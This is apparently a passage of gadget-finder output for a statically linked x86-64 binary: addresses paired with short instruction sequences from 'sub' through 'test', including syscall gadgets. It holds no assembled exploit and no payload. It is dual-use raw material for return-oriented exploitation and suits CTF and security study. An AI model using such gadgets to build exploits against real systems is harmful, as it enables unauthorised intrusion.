0x000000000048ecd3 : sub byte ptr [rbx - 0x26], dh ; mov eax, 1 ; ret
0x000000000048ecd2 : sub byte ptr [rbx - 0x26], sil ; mov eax, 1 ; ret
0x000000000040c19c : sub byte ptr [rbx - 1], al ; dec dword ptr [rax - 0x77] ; ret 0xf748
0x000000000041fce0 : sub byte ptr [rbx], bl ; sub al, byte ptr [rax] ; ret
0x0000000000486325 : sub byte ptr [rcx - 0x73], cl ; adc byte ptr [r11 + rcx*4 + 0xd], r9b ; jmp rbx
0x0000000000452c0c : sub byte ptr [rcx], al ; ret
0x000000000049be2c : sub byte ptr [rdi], 0xfa ; call qword ptr [rax]
0x0000000000428186 : sub byte ptr [rdi], cl ; test ebx, esi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000049d720 : sub byte ptr [rdx - 5], ch ; call qword ptr [rbx]
0x000000000049d70c : sub byte ptr [rdx - 5], ch ; call rdx
0x000000000042b08a : sub byte ptr [rdx], al ; add bh, dh ; ret 0
0x000000000042b0cb : sub byte ptr [rdx], al ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x00000000004bc758 : sub byte ptr [rdx], ch ; std ; jmp qword ptr [rcx]
0x00000000004bc6bd : sub ch, bh ; jmp qword ptr [rdx]
0x000000000049b185 : sub cl, bh ; push qword ptr [rax + 0x29] ; stc ; call qword ptr [rax]
0x000000000046ecc6 : sub cl, bpl ; ret 0xffe8
0x00000000004154cd : sub cl, byte ptr [rax - 0x77] ; ror byte ptr [rax - 0x7d], 1 ; ret 0x4801
0x000000000046ecc7 : sub cl, ch ; ret 0xffe8
0x00000000004b90e8 : sub cl, ch ; std ; call rdx
0x00000000004b8310 : sub dh, 0xfd ; jmp qword ptr [rdx]
0x0000000000464d94 : sub dh, al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000049be5d : sub dl, bh ; call rax
0x000000000049bedd : sub dl, bh ; jmp qword ptr [rdx + 0x22fffa27]
0x000000000049bed9 : sub dl, bh ; jmp qword ptr [rdx]
0x000000000049c059 : sub dl, bh ; jmp rax
0x000000000049c055 : sub dl, bh ; push qword ptr [rax + 0x28] ; cli ; jmp rax
0x000000000046178a : sub dl, byte ptr [rbx] ; add byte ptr es:[rax + rcx - 0xd], dh ; ret
0x0000000000486caa : sub dl, dh ; call r11
0x000000000047e1a2 : sub dword ptr [rax + 0xf000002], -0x7b ; ret
0x000000000042624a : sub dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000042af4c : sub dword ptr [rax], eax ; add dh, byte ptr [rax + rcx - 9] ; ret 0
0x00000000004262aa : sub dword ptr [rax], eax ; ret
0x0000000000434997 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4349ad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434ae7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x434afd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434c37 : sub dword ptr [rdi + 0x10], ebx ; jb 0x434c4d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434d87 : sub dword ptr [rdi + 0x10], ebx ; jb 0x434d9d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000434ed7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x434eed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435027 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43503d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435177 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43518d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004352c7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4352dd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435417 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43542d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435567 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43557d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004356b7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4356cd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435807 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43581d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435957 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43596d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435aa7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x435abd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000435bf7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x435c0d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437367 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43737d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004374b7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4374cd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437607 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43761d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437757 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43776d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004378a7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4378bd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004379f7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x437a0d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437b47 : sub dword ptr [rdi + 0x10], ebx ; jb 0x437b5d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437c97 : sub dword ptr [rdi + 0x10], ebx ; jb 0x437cad ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437de7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x437dfd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000437f37 : sub dword ptr [rdi + 0x10], ebx ; jb 0x437f4d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000438087 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43809d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004381d7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4381ed ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000438327 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43833d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x0000000000438477 : sub dword ptr [rdi + 0x10], ebx ; jb 0x43848d ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004385c7 : sub dword ptr [rdi + 0x10], ebx ; jb 0x4385dd ; movaps xmmword ptr [rdi], xmm4 ; jmp r9
0x00000000004348f3 : sub dword ptr [rdi - 0x10], ebp ; jmp r9
0x00000000004348ef : sub dword ptr [rdi - 0x20], esp ; movaps xmmword ptr [rdi - 0x10], xmm5 ; jmp r9
0x000000000043499d : sub dword ptr [rdi], esp ; jmp r9
0x000000000049d71c : sub dword ptr [rdx - 5], 0xfb6a28ff ; call qword ptr [rbx]
0x000000000041aed4 : sub dword ptr [rdx], 0x4f0f4800 ; ret 0x8948
0x000000000042af6b : sub dword ptr [rdx], eax ; add byte ptr [rax + 0xf], cl ; ret 0xfc3
0x0000000000434096 : sub dword ptr [rip - 0xcfffffe], 0xf ; outsd dx, dword ptr [rsi] ; push rdi ; ret
0x0000000000432a07 : sub eax, -1 ; jne 0x432a18 ; vzeroupper ; ret
0x00000000004298da : sub eax, 0x10 ; ret
0x000000000049bc41 : sub eax, 0x2d40fffa ; cli ; call rax
0x000000000049be3d : sub eax, 0x2d50fffa ; cli ; jmp rax
0x000000000049bcfd : sub eax, 0x2d82fffa ; cli ; call qword ptr [rdx]
0x0000000000470174 : sub eax, 0x83000000 ; ret
0x000000000046d545 : sub eax, 0x83000000 ; ret 0x8b01
0x000000000042afd2 : sub eax, 0xf480002 ; ret 0x66c3
0x000000000045f3c4 : sub eax, 1 ; mov dword ptr [rbx + 8], eax ; pop rbx ; ret
0x000000000044d494 : sub eax, 1 ; ret
0x00000000004886a6 : sub eax, dword ptr [0] ; ret
0x000000000040a1bd : sub eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret
0x000000000040850f : sub eax, dword ptr [rbx + 8] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000464d36 : sub eax, dword ptr [rcx + 0xf] ; mov dh, 0x47 ; or al, 0x83 ; ret
0x000000000041faee : sub eax, dword ptr [rdi + 0x18] ; ret
0x000000000044f1ba : sub eax, dword ptr [rdx + rcx*4] ; je 0x44f1a6 ; ret
0x000000000042b132 : sub eax, dword ptr [rdx] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x000000000041ee03 : sub eax, dword ptr [rsi + 0x10] ; ret
0x000000000045c433 : sub eax, eax ; cli ; inc dword ptr [rcx - 0x77] ; ret 0x5be9
0x000000000044d5fd : sub eax, eax ; cmp eax, ecx ; jle 0x44d641 ; movsxd rax, ecx ; ret
0x0000000000487b14 : sub eax, eax ; ret
0x0000000000432a53 : sub eax, ecx ; je 0x432a69 ; sbb eax, eax ; or eax, 1 ; ret
0x000000000041e4d9 : sub eax, ecx ; lea eax, dword ptr [r8 - 1] ; ret
0x000000000048b170 : sub eax, ecx ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00000000004019e3 : sub eax, ecx ; ret
0x00000000004475a9 : sub eax, edi ; ret
0x000000000047b17e : sub eax, edi ; shr rax, 2 ; ret
0x000000000048b253 : sub eax, edx ; mov dword ptr [rdx], eax ; mov eax, 2 ; ret
0x000000000041ee2b : sub eax, edx ; ret
0x000000000047b570 : sub eax, edx ; shr rax, 2 ; vzeroupper ; ret
0x0000000000432a1c : sub eax, edx ; vzeroupper ; ret
0x000000000044d65d : sub eax, esi ; ret
0x0000000000487b13 : sub eax, r8d ; ret
0x00000000004aee3e : sub ebp, eax ; fcomp qword ptr [rdi - 0x4a] ; ret 0x474c
0x000000000041a820 : sub ebp, eax ; mov rax, rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004193f6 : sub ebx, dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x00000000004ad8d5 : sub ebx, dword ptr [rbx - 0xb] ; pop rbx ; and dword ptr [rsi + rbp*2 - 0x7a], edi ; lahf ; ret 0x871e
0x000000000040196a : sub ecx, 1 ; jne 0x401959 ; mov rax, r11 ; ret
0x0000000000453a78 : sub ecx, dword ptr [rax - 0x75] ; push rax ; or dh, dh ; ret 0x8902
0x000000000047a704 : sub ecx, dword ptr [rcx + rcx*4 - 0x40] ; vzeroupper ; ret
0x000000000049b189 : sub ecx, edi ; call qword ptr [rax]
0x000000000049be11 : sub edi, edx ; jmp qword ptr [rax]
0x000000000041ee30 : sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x000000000041ee25 : sub edx, dword ptr [rax + 0x18] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x0000000000431ea4 : sub edx, eax ; jbe 0x431ee7 ; add rax, rdi ; ret
0x0000000000431eb4 : sub edx, eax ; jbe 0x431ee9 ; lea rax, qword ptr [rdi + rax + 0x10] ; ret
0x0000000000431ec4 : sub edx, eax ; jbe 0x431ee9 ; lea rax, qword ptr [rdi + rax + 0x20] ; ret
0x0000000000431ed4 : sub edx, eax ; jbe 0x431ee9 ; lea rax, qword ptr [rdi + rax + 0x30] ; ret
0x000000000049be55 : sub edx, edi ; jmp rax
0x000000000042a2d1 : sub edx, esi ; add dword ptr [rax], eax ; cmovne rax, rdx ; ret
0x0000000000419dcf : sub edx, esi ; mov qword ptr [rsp], rcx ; mov rdi, rbx ; call rax
0x000000000041c1c4 : sub edx, esi ; sar rdx, 2 ; call 0x418428
0x00000000004913d3 : sub esp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041657d : sub esp, 0x80 ; call 0x452838
0x00000000004165f1 : sub esp, 0x80 ; call 0x452868
0x0000000000499091 : sub esp, 8 ; add rsp, 8 ; ret
0x000000000048e3d7 : sub esp, dword ptr [rbx] ; add byte ptr [rax], al ; jne 0x48e3e6 ; pop rbx ; ret
0x000000000042a2a1 : sub esp, dword ptr [rdi] ; add byte ptr [rax], al ; cmovne rax, rdx ; ret
0x000000000041e4d8 : sub r8, rcx ; lea eax, dword ptr [r8 - 1] ; ret
0x00000000004298d9 : sub rax, 0x10 ; ret
0x000000000044d493 : sub rax, 1 ; ret
0x00000000004886a5 : sub rax, qword ptr [0] ; ret
0x000000000041faed : sub rax, qword ptr [rdi + 0x18] ; ret
0x00000000004886a4 : sub rax, qword ptr fs:[0] ; ret
0x000000000048be82 : sub rax, r8 ; ret
0x00000000004019e2 : sub rax, rcx ; ret
0x00000000004475a8 : sub rax, rdi ; ret
0x000000000047b17d : sub rax, rdi ; shr rax, 2 ; ret
0x000000000044d563 : sub rax, rdx ; ret
0x00000000004475ff : sub rax, rdx ; vzeroupper ; ret
0x000000000044d65c : sub rax, rsi ; ret
0x0000000000431ea3 : sub rdx, rax ; jbe 0x431ee8 ; add rax, rdi ; ret
0x000000000041c1c3 : sub rdx, rsi ; sar rdx, 2 ; call 0x418429
0x00000000004913d2 : sub rsp, -0x80 ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000041657c : sub rsp, 0x80 ; call 0x452839
0x00000000004165f0 : sub rsp, 0x80 ; call 0x452869
0x0000000000499090 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000452877 : syscall ; pop rdx ; pop rsi ; ret
0x000000000047ba25 : syscall ; ret
0x00000000004b8109 : test ah, dh ; jmp qword ptr [rbx]
0x00000000004883d7 : test al, 0 ; add byte ptr [rax], al ; add byte ptr [rax - 0x73], cl ; ret 0xeb30
0x000000000041dd44 : test al, 0 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000047c115 : test al, 0 ; add byte ptr [rax], al ; pop rbx ; pop rbp ; ret
0x0000000000491b63 : test al, 0 ; add byte ptr [rax], al ; ret
0x000000000049c3d8 : test al, 0x28 ; sti ; jmp rax
0x00000000004516fe : test al, 0x45 ; mov esp, esi ; call r15
0x0000000000469e1c : test al, 0x66 ; stc ; dec dword ptr [rax + 0x29] ; ret
0x000000000045249a : test al, 0x75 ; ret
0x00000000004ae197 : test al, 0x97 ; xchg eax, esp ; ret
0x00000000004b5461 : test al, 0xf6 ; call qword ptr [rsi]
0x0000000000485395 : test al, al ; cmove rcx, rax ; mov rax, rcx ; ret
0x000000000042c9ba : test al, al ; jne 0x42c9a8 ; xor eax, eax ; sub eax, ecx ; ret
0x000000000047eb43 : test al, bh ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004797bc : test bh, dh ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x0000000000420408 : test bl, al ; add dword ptr [rax], eax ; add byte ptr [rax + 1], cl ; ret
0x0000000000416a9f : test byte ptr [rax + rax - 0x76b80000], ch ; ret
0x000000000045fab1 : test byte ptr [rax - 0x76b80000], ch ; ret 0x2948
0x00000000004717d9 : test byte ptr [rax - 0x7c000019], ah ; ret
0x00000000004153ea : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rbx]
0x00000000004207ca : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rax
0x000000000048c48a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; call rbx
0x000000000044b7da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, qword ptr [rdi] ; ret
0x000000000044ac1a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x000000000041f15a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x00000000004196da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x000000000041829a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000041f11a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000401daa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000044b61a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x0000000000407357 : test byte ptr [rax], dl ; ret
0x0000000000455bc2 : test byte ptr [rbp + rcx*4 + 0x3c], cl ; ret
0x00000000004716dc : test byte ptr [rbp - 0x7c000018], bl ; ret
0x0000000000492c6b : test byte ptr [rcx + rax - 0x20], cl ; jmp rax
0x0000000000494802 : test byte ptr [rcx + rcx*4 - 0x19], 0x41 ; call rdi
0x0000000000468652 : test byte ptr [rcx - 0x7a000007], al ; ror byte ptr [rdi], 0x84 ; ret
0x000000000045d014 : test byte ptr [rdi + 0x48000001], bl ; mov edx, eax ; jmp 0x45cfd7
0x0000000000452194 : test byte ptr [rdi - 0x7d000000], bl ; ret
0x000000000042ab06 : test byte ptr [rdi], 0x84 ; ret
0x0000000000450cdf : test byte ptr [rdi], 0x94 ; ret 0xc221
0x00000000004507f6 : test byte ptr [rdi], 0x94 ; ret 0xca21
0x0000000000479b44 : test byte ptr [rdi], bh ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x0000000000479b5c : test byte ptr [rdi], dl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x000000000045d419 : test byte ptr [rdx + 0x48fffffd], bl ; mov edx, eax ; jmp 0x45d3dc
0x000000000042684e : test byte ptr [rdx], ah ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x00000000004797a4 : test byte ptr [rdx], al ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe901
0x000000000042834e : test byte ptr [rdx], al ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x000000000042884e : test byte ptr [rdx], dl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000470264 : test byte ptr [rip - 0x7c000003], dl ; ret
0x0000000000465c94 : test byte ptr [rip - 0x7c000011], al ; ret
0x000000000047a39d : test byte ptr [rsi + 0x48000000], bl ; bsf eax, edx ; ret
0x0000000000459e11 : test byte ptr [rsi - 0x8fffffc], cl ; ret 0
0x000000000044748d : test byte ptr [rsi], bh ; add byte ptr [rax], al ; bsf rax, rdx ; ret
0x0000000000490a5a : test cl, bl ; add eax, dword ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x000000000044d11f : test cl, cl ; jne 0x44d114 ; ret
0x000000000044d1cf : test cl, cl ; jne 0x44d1c4 ; ret
0x000000000044d48f : test cl, cl ; jne 0x44d488 ; sub rax, 1 ; ret
0x00000000004577a5 : test dh, dh ; mov edx, 0xffffffff ; cmovs eax, edx ; ret
0x000000000044b664 : test dl, 0x40 ; jne 0x44b629 ; lea rax, qword ptr [rdi + 7] ; ret
0x000000000044b692 : test dl, 4 ; jne 0x44b629 ; lea rax, qword ptr [rdi + 3] ; ret
0x000000000049c1d9 : test dl, bh ; call rax
0x00000000004005c3 : test dl, dl ; jne 0x4005ce ; ret
0x0000000000414466 : test dl, dl ; jne 0x414448 ; ret
0x000000000044d33f : test dl, dl ; jne 0x44d338 ; lea rax, qword ptr [rcx - 1] ; ret
0x0000000000487a87 : test dl, dl ; jne 0x487a63 ; movsx eax, cl ; neg eax ; ret
0x0000000000498753 : test dword ptr [rax + 0xf000008], ecx ; xchg eax, ebx ; ret 0x3d83
0x00000000004797bd : test dword ptr [rax], 0x83480000 ; ret 0xe901
0x000000000046f746 : test dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x0000000000408b21 : test dword ptr [rax], eax ; add rax, r13 ; jmp rax
0x0000000000454131 : test dword ptr [rax], eax ; add rax, rbp ; jmp rax
0x0000000000465709 : test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x000000000046fe56 : test dword ptr [rax], esi ; idiv edi ; dec dword ptr [rax - 0x39] ; ret 0x2c20
0x0000000000408b20 : test dword ptr [rax], r8d ; add rax, r13 ; jmp rax
0x0000000000454130 : test dword ptr [rax], r8d ; add rax, rbp ; jmp rax
0x000000000041f1ca : test dword ptr [rbx + 0x2a], ecx ; add byte ptr [rcx], al ; ret
0x0000000000431e28 : test dword ptr [rbx + 0x31000000], esp ; rol bl, 0x83 ; ret 0x6620
0x0000000000450509 : test dword ptr [rbx + 0x48000000], ebp ; add esp, 0x78 ; ret
0x0000000000433b97 : test dword ptr [rbx + 7], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000433fe6 : test dword ptr [rbx + rax], eax ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000432c68 : test dword ptr [rbx - 0x3a000003], esp ; std ; xlatb ; ret 0xe883
0x0000000000426688 : test dword ptr [rbx], edx ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000047c2cb : test dword ptr [rcx + 0x48000000], edi ; add esp, 0x78 ; ret
0x0000000000433b6d : test dword ptr [rcx + 7], esi ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000433a7d : test dword ptr [rcx + 8], esp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000043398d : test dword ptr [rcx + 9], edx ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000423a82 : test dword ptr [rcx + rcx*4 + 0x54], 0x93e80824 ; ret 0xffff
0x0000000000494be4 : test dword ptr [rdi + rdi*8 - 1], esi ; dec dword ptr [rax - 0x7d] ; ret
0x0000000000423a1c : test dword ptr [rdi], eax ; add eax, 0x39480000 ; ret 0xf275
0x00000000004338b2 : test dword ptr [rdx + rcx], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000047a183 : test dword ptr [rip - 0x76ffffff], edi ; ret 0x8948
0x0000000000450176 : test dword ptr [rsi + 0x48000000], ebp ; add esp, 0x68 ; ret
0x000000000044cea2 : test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004665d1 : test dword ptr [rsi - 0x16000007], esi ; ret
0x000000000041663d : test dword ptr [rsi - 0x77000000], esp ; ret 0xe281
0x0000000000433db8 : test dword ptr [rsi], esp ; add eax, 0xc0310000 ; ret
0x00000000004afe80 : test eax, 0x7d4c8c5d ; ret 0xd8f
0x0000000000439a36 : test eax, 0x7f0f41f3 ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x0000000000416b25 : test eax, 0x8948002a ; ret 0x8948
0x00000000004bd305 : test eax, 0x8db80000 ; std ; call qword ptr [rdx]
0x00000000004aacb5 : test eax, 0xa900fffc ; cld ; call rax
0x00000000004aaca5 : test eax, 0xa900fffc ; cld ; jmp rax
0x000000000045271b : test eax, eax ; cmove eax, edx ; ret
0x000000000040040c : test eax, eax ; je 0x400416 ; call rax
0x0000000000401b76 : test eax, eax ; je 0x401b85 ; ret
0x0000000000429851 : test eax, eax ; je 0x429868 ; lea rax, qword ptr [rdx - 0x10] ; ret
0x0000000000431b78 : test eax, eax ; je 0x431b84 ; xchg eax, edx ; sub eax, edx ; ret
0x0000000000450f18 : test eax, eax ; je 0x450f23 ; ret
0x0000000000453fc6 : test eax, eax ; je 0x453fd5 ; ret
0x000000000045fdc4 : test eax, eax ; je 0x45fdce ; call rax
0x00000000004611c9 : test eax, eax ; je 0x4611d3 ; call rax
0x000000000048bc40 : test eax, eax ; je 0x48bc58 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004960a8 : test eax, eax ; je 0x4960b5 ; ret
0x00000000004961b8 : test eax, eax ; je 0x4961c5 ; ret
0x0000000000497951 : test eax, eax ; je 0x497960 ; call rax
0x000000000041de4c : test eax, eax ; jne 0x41de45 ; ret
0x000000000041ede4 : test eax, eax ; jne 0x41eddd ; ret
0x0000000000431e55 : test eax, eax ; jne 0x431eb6 ; xor eax, eax ; ret
0x00000000004322d1 : test eax, eax ; jne 0x4322f9 ; xor eax, eax ; vzeroupper ; ret
0x0000000000452850 : test eax, eax ; jne 0x45284b ; pop rdx ; pop r10 ; ret
0x00000000004960e7 : test eax, eax ; jne 0x4960f5 ; ret
0x0000000000496102 : test eax, eax ; jne 0x496115 ; ret
0x0000000000496332 : test eax, eax ; jne 0x496345 ; ret
0x0000000000482850 : test eax, eax ; js 0x482867 ; pop rbx ; ret
0x0000000000401e12 : test eax, eax ; mov eax, ebx ; cmovne eax, edx ; pop rbx ; ret
0x0000000000470845 : test eax, ebp ; idiv bh ; jmp qword ptr [rax]
0x000000000047717a : test eax, ebx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x0000000000401df5 : test eax, esi ; setne al ; movzx eax, al ; ret
0x00000000004511b9 : test ebp, ebp ; jne 0x4511d8 ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000451d24 : test ebp, ebp ; jne 0x451d50 ; mov rdi, qword ptr [rbx] ; call r12
0x0000000000451d57 : test ebp, ebp ; jne 0x451da9 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451d83 : test ebp, ebp ; jne 0x451e09 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000496e21 : test ebp, ebp ; jne 0x496e10 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004979db : test ebp, ebp ; jne 0x4979c8 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004b33c9 : test ebp, esi ; call qword ptr [rdx]
0x0000000000421988 : test ebx, ebp ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x0000000000431d90 : test ebx, ebx ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x0000000000428690 : test ebx, edi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000428188 : test ebx, esi ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x000000000045b5a9 : test ecx, eax ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000047eb98 : test ecx, eax ; add dword ptr [rax], eax ; add byte ptr [rcx], dh ; fisttp dword ptr [rax - 0x7d] ; ret
0x000000000044b652 : test ecx, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7520
0x000000000047b259 : test ecx, ecx ; jne 0x47b218 ; mov rax, rdx ; ret
0x00000000004511df : test edi, edi ; jne 0x451229 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451207 : test edi, edi ; jne 0x451249 ; mov rdi, qword ptr [rbp] ; call r12
0x0000000000451e0f : test edi, edi ; jne 0x451e7a ; mov rdi, qword ptr [r13] ; call r12
0x0000000000451e3f : test edi, edi ; jne 0x451eab ; mov rdi, qword ptr [r13] ; call r12
0x0000000000485fca : test edi, edi ; jne 0x485fa5 ; ret
0x000000000048b31d : test edi, edi ; mov byte ptr [rsi], al ; jne 0x48b311 ; mov rax, rsi ; ret
0x000000000049c1dd : test edx, edi ; push qword ptr [rax - 0x79] ; cli ; call qword ptr [rax]
0x0000000000447442 : test edx, edx ; je 0x447450 ; bsf eax, edx ; ret
0x0000000000447442 : test edx, edx ; je 0x447451 ; bsf eax, edx ; ret
0x00000000004474eb : test edx, edx ; je 0x447507 ; bsf rax, rdx ; ret
0x00000000004474eb : test edx, edx ; je 0x447508 ; bsf rax, rdx ; ret
0x000000000045329a : test edx, edx ; je 0x4532b1 ; lea rdi, qword ptr [rcx + rax + 0x20] ; jmp rdx
0x000000000047a40a : test edx, edx ; je 0x47a437 ; bsf rax, rdx ; ret
0x000000000047a40a : test edx, edx ; je 0x47a438 ; bsf rax, rdx ; ret
0x000000000041b293 : test edx, edx ; jne 0x41b2a5 ; ret
0x000000000041cf2f : test edx, edx ; jne 0x41cf25 ; ret
0x00000000004775ff : test edx, edx ; jne 0x4775f5 ; ret
0x000000000047afba : test edx, edx ; jne 0x47afb5 ; ret
0x000000000044b645 : test esi, edx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x000000000045fcc8 : test esi, esi ; je 0x45fcd2 ; call rsi
0x000000000047a301 : test esi, esi ; jne 0x47a310 ; xor rax, rax ; ret
0x000000000047afc1 : test esi, esi ; jne 0x47afd0 ; xor rax, rax ; ret
0x0000000000465494 : test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x000000000044b65f : test esp, ebx ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7540
0x00000000004b8108 : test r12b, r14b ; jmp qword ptr [rbx]
0x0000000000431b77 : test r8d, r8d ; je 0x431b85 ; xchg eax, edx ; sub eax, edx ; ret
0x000000000047b258 : test r9d, r9d ; jne 0x47b219 ; mov rax, rdx ; ret
0x000000000040040b : test rax, rax ; je 0x400417 ; call rax
0x0000000000429850 : test rax, rax ; je 0x429869 ; lea rax, qword ptr [rdx - 0x10] ; ret
0x0000000000450f17 : test rax, rax ; je 0x450f24 ; ret
0x000000000045fdc3 : test rax, rax ; je 0x45fdcf ; call rax
0x00000000004611c8 : test rax, rax ; je 0x4611d4 ; call rax
